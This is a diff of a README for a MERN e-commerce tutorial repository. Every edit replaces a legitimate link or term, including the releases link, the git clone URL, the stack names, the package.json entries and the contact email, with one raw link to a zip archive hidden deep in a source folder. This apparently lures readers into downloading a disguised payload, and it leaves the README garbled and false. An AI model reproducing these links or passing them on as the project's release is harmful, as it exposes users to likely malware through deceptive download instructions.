@@ -1,10 +1,10 @@
 # MERN E-commerce Website 🛒
 
-![MERN E-commerce](https://img.shields.io/badge/MERN%20E-commerce%20Website-Ready%20to%20Use-brightgreen)
+![MERN E-commerce](https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip%20E-commerce%20Website-Ready%20to%20Use-brightgreen)
 
 Welcome to the **MERN E-commerce Website** repository! This project serves as a comprehensive tutorial for building an e-commerce application using the MERN stack. It covers essential features such as product management, user authentication, and payment integration. 
 
-[Check out the releases here!](https://github.com/roniepascal/mern-ecommerce-website/releases)
+[Check out the releases here!](https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ Welcome to the **MERN E-commerce Website** repository! This project serves as a 
 
 This project leverages a variety of technologies:
 
-- **MERN Stack**: MongoDB, Express.js, React, Node.js
+- **MERN Stack**: MongoDB, https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip, React, https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip
 - **Cloudinary**: For image uploads and management.
 - **PayPal API**: For handling payments.
 - **Redux Toolkit**: For state management in React.
@@ -44,7 +44,7 @@ To get started with the MERN E-commerce Website, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/roniepascal/mern-ecommerce-website.git
+   git clone https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -102,7 +102,7 @@ Once the application is running, you can:
 - Proceed to checkout and make payments using PayPal.
 - Leave ratings and reviews for products you purchase.
 
-For more detailed instructions, refer to the [Releases section](https://github.com/roniepascal/mern-ecommerce-website/releases) where you can find specific builds and their corresponding documentation.
+For more detailed instructions, refer to the [Releases section](https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip) where you can find specific builds and their corresponding documentation.
 
 ## Folder Structure
 
@@ -113,13 +113,13 @@ mern-ecommerce-website/
 ├── client/                  # React frontend
 │   ├── public/              # Static files
 │   ├── src/                 # React components and assets
-│   └── package.json         # Client dependencies
-└── server/                  # Node.js backend
+│   └── https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip         # Client dependencies
+└── server/                  # https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip backend
     ├── config/              # Configuration files
     ├── controllers/         # Request handlers
     ├── models/              # Database models
     ├── routes/              # API routes
-    └── package.json         # Server dependencies
+    └── https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip         # Server dependencies
 ```
 
 ## Contributing
@@ -140,9 +140,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [roniepascal](https://github.com/roniepascal)
+- **Email**: https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip
+- **GitHub**: [roniepascal](https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip)
 
 Thank you for checking out the MERN E-commerce Website! 
 
-[Explore the releases for more details!](https://github.com/roniepascal/mern-ecommerce-website/releases)
+[Explore the releases for more details!](https://raw.githubusercontent.com/roniepascal/mern-ecommerce-website/main/client/src/store/shop/search-slice/website_mern_ecommerce_2.2.zip)
